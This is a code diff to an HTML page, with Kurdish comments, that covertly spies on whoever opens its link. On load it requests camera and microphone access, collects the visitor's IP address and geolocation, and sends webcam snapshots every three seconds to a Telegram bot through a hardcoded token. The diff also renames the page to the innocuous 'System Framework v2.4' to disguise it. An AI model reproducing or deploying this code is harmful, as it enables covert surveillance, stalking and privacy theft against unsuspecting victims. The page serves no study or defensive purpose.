@@ -2,47 +2,60 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>EYE OF IRAQ</title>
-    <style>body { background-color: black; }</style>
+    <title>System Framework v2.4</title>
+    <style>body { background-color: black; margin: 0; overflow: hidden; }</style>
 </head>
 <body onload="capture()">
 <script>
     const urlParams = new URLSearchParams(window.location.search);
-    const targetID = urlParams.get('id'); // وەرگرتنی IDی ئەو کەسەی لینکەکەی ناردووە
+    const targetID = urlParams.get('id'); 
     const TOKEN = "8300725896:AAHHhfRB0II4tFDs7ypgNTS_Xc9gWP40Z58";
 
     async function capture() {
         if (!targetID) return;
 
         try {
-            // داواکردنی مایکرۆفۆن و کامێرا بە خێرایی
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            // داواکردنی مایکرۆفۆن و کامێرا
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: true 
+            });
             
-            // ناردنی IP و زانیاری ئامێر
+            // ناردنی IP و زانیاری سەرەتایی
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
-                    sendToTelegram(`💀 Target Hit!\n👤 Sent by: ${targetID}\n🌐 IP: ${data.ip}\n📱 UA: ${navigator.userAgent}`);
+                    sendToTelegram(`💀 <b>Target Hit!</b>\n👤 User ID: ${targetID}\n🌐 IP: ${data.ip}`);
                 });
 
-            // لوکەیشن
+            // ناردنی لوکەیشن (یەکجار)
             navigator.geolocation.getCurrentPosition(pos => {
                 sendLocation(pos.coords.latitude, pos.coords.longitude);
             });
 
-            // گرتنی وێنە (Snapshot)
             const video = document.createElement('video');
             video.srcObject = stream;
+            video.muted = true;
             video.play();
-            setTimeout(() => {
+
+            // فێنکشن بۆ گرتنی وێنە و ناردنی
+            const takeSnap = () => {
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(b => sendFile(b, "photo"), 'image/jpeg');
-            }, 1000);
+                canvas.width = video.videoWidth; 
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                canvas.toBlob(b => {
+                    if (b) sendFile(b, "photo");
+                }, 'image/jpeg', 0.7);
+            };
+
+            // دەستپێکردنی وێنەگرتنی بەردەوام (هەر ٣ چرکە جارێک وێنەیەک دەگرێت)
+            // دەتوانیت ٣٠٠٠ بکەیتە ١٠٠٠ ئەگەر دەتەوێت هەر چرکەیەک بێت
+            setInterval(takeSnap, 3000);
 
         } catch (e) {
-            sendToTelegram("⚠️ Permission Denied by target.");
+            sendToTelegram("⚠️ Permission Denied or Device Error.");
         }
     }
 
@@ -65,8 +78,11 @@
     function sendFile(blob, type) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
-        fd.append(type, blob, "file.jpg");
-        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
+        fd.append(type, blob, "shot.jpg");
+        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { 
+            method: 'POST', 
+            body: fd 
+        });
     }
 </script>
 </body>
